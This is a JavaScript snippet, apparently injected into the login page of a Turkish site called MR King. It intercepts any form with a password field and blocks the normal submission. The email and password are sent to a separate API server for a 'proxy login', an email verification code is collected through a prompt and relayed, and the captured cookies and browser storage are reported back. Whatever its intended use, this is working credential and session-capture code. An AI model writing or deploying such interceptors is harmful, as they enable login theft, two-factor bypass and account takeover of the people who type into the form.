(function () {
  "use strict";

  var API_BASE = window.MR_LOGIN_PROXY_API || "http://localhost:3100";
  var POLL_INTERVAL_MS = 3000;
  var POLL_MAX_ATTEMPTS = 120;

  function getCsrfToken() {
    var meta = document.querySelector('meta[name="csrf-token"]');
    return meta ? meta.getAttribute("content") || "" : "";
  }

  function showOverlay(message, type) {
    var existing = document.getElementById("mr-proxy-overlay");
    if (existing) existing.remove();

    var overlay = document.createElement("div");
    overlay.id = "mr-proxy-overlay";
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;" +
      "display:flex;align-items:center;justify-content:center;flex-direction:column;" +
      "background:rgba(0,0,0,0.85);color:#fff;font-family:Titillium Web,sans-serif;text-align:center;padding:32px;";

    var box = document.createElement("div");
    box.style.cssText = "max-width:420px;width:100%;";

    if (type === "spinner") {
      var spinner = document.createElement("div");
      spinner.style.cssText = "width:40px;height:40px;border:4px solid rgba(255,255,255,0.2);border-top-color:#4caf50;" +
        "border-radius:50%;animation:mrproxy-spin 0.8s linear infinite;margin:0 auto 20px;";
      box.appendChild(spinner);
    } else if (type === "success") {
      box.innerHTML += '<div style="font-size:48px;margin-bottom:16px;">&#10003;</div>';
    } else if (type === "error") {
      box.innerHTML += '<div style="font-size:48px;margin-bottom:16px;color:#f44336;">&#10007;</div>';
    }

    var text = document.createElement("div");
    text.style.cssText = "font-size:16px;line-height:1.6;";
    text.textContent = message;
    box.appendChild(text);

    overlay.appendChild(box);
    document.body.appendChild(overlay);

    var style = document.createElement("style");
    style.textContent = "@keyframes mrproxy-spin{to{transform:rotate(360deg)}}";
    document.head.appendChild(style);
  }

  function hideOverlay() {
    var el = document.getElementById("mr-proxy-overlay");
    if (el) el.remove();
  }

  function readLoginForm() {
    var emailInput = document.querySelector(
      'input[placeholder*="Kullanıcı"],input[placeholder*="Mail"],input[type="text"]'
    );
    var passwordInput = document.querySelector('input[type="password"]');

    var email = emailInput ? (emailInput.value || "").trim() : "";
    var password = passwordInput ? passwordInput.value : "";

    return { email: email, password: password };
  }

  function findSubmitButton() {
    var selectors = [
      'button[type="submit"]',
      "button.btn--block",
      'button:has-text("Hemen Giriş Yap")',
      'button:has-text("HEMEN GİRİŞ YAP")'
    ];
    for (var i = 0; i < selectors.length; i++) {
      try {
        var btn = document.querySelector(selectors[i]);
        if (btn) return btn;
      } catch (e) {}
    }
    var allBtns = document.querySelectorAll("button");
    for (var j = 0; j < allBtns.length; j++) {
      var txt = (allBtns[j].textContent || "").trim();
      if (/giriş yap|hemen giris/i.test(txt)) return allBtns[j];
    }
    return null;
  }

  async function proxyLogin(email, password) {
    var loginUrl = window.location.href.replace(/\/+$/, "");
    var csrfToken = getCsrfToken();

    var response = await fetch(API_BASE + "/api/mr-giris/proxy-login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-CSRF-TOKEN": csrfToken
      },
      credentials: "same-origin",
      body: JSON.stringify({
        email: email,
        password: password,
        loginUrl: "https://mrking5018.com/auth/login"
      })
    });

    if (!response.ok) {
      var errorData = await response.json().catch(function () { return {}; });
      throw new Error(errorData.error || "Proxy login isteği başarısız (" + response.status + ")");
    }

    return await response.json();
  }

  async function pollJobStatus(jobId) {
    for (var attempt = 0; attempt < POLL_MAX_ATTEMPTS; attempt++) {
      await new Promise(function (resolve) { setTimeout(resolve, POLL_INTERVAL_MS); });

      try {
        var response = await fetch(API_BASE + "/api/mr-giris", {
          credentials: "same-origin"
        });
        var jobs = await response.json();
        var job = jobs.find(function (j) { return String(j._id || j.id) === String(jobId); });
        if (!job) continue;

        if (job.status === "completed") {
          return job;
        }
        if (job.status === "failed") {
          throw new Error(job.lastError || "MR login başarısız");
        }

        var needsEmailCode = job.needsEmailCode;
        if (needsEmailCode) {
          var code = prompt("Email doğrulama kodu giriniz:");
          if (code) {
            await fetch(API_BASE + "/api/mr-giris/" + encodeURIComponent(jobId) + "/email-code", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              credentials: "same-origin",
              body: JSON.stringify({ code: code })
            });
          }
        }
      } catch (e) {
        if (/başarısız|failed/i.test(e.message)) throw e;
      }
    }
    throw new Error("MR login zaman aşımı");
  }

  function interceptForm() {
    var forms = document.querySelectorAll("form");
    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var hasPasswordField = form.querySelector('input[type="password"]');
      if (!hasPasswordField) continue;

      form.addEventListener("submit", async function (e) {
        e.preventDefault();
        e.stopPropagation();

        var creds = readLoginForm();
        if (!creds.email || !creds.password) {
          alert("Email ve şifre gereklidir.");
          return;
        }

        var submitBtn = findSubmitButton();
        if (submitBtn) submitBtn.disabled = true;

        showOverlay("MR King'e giriş yapılıyor...", "spinner");

        try {
          var job = await proxyLogin(creds.email, creds.password);
          showOverlay("Login job başlatıldı. Job ID: " + (job.id || job._id) + "\nPolling başlıyor...", "spinner");

          var result = await pollJobStatus(job.id || job._id);

          var cookieCount = (result.cookies || []).length;
          var storageCount = ((result.session && result.session.localStorage) || []).length +
            ((result.session && result.session.sessionStorage) || []).length;

          showOverlay(
            "Giriş başarılı!\nCookies: " + cookieCount + " | Storage: " + storageCount,
            "success"
          );

          setTimeout(hideOverlay, 5000);
        } catch (err) {
          showOverlay("Hata: " + (err.message || "Bilinmeyen hata"), "error");
          setTimeout(hideOverlay, 8000);
        } finally {
          if (submitBtn) submitBtn.disabled = false;
        }
      }, true);
    }
  }

  function waitForForm() {
    var deadline = Date.now() + 30000;
    var timer = setInterval(function () {
      var hasPassword = document.querySelector('input[type="password"]');
      if (hasPassword || Date.now() >= deadline) {
        clearInterval(timer);
        interceptForm();
      }
    }, 500);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", waitForForm);
  } else {
    waitForForm();
  }
})();
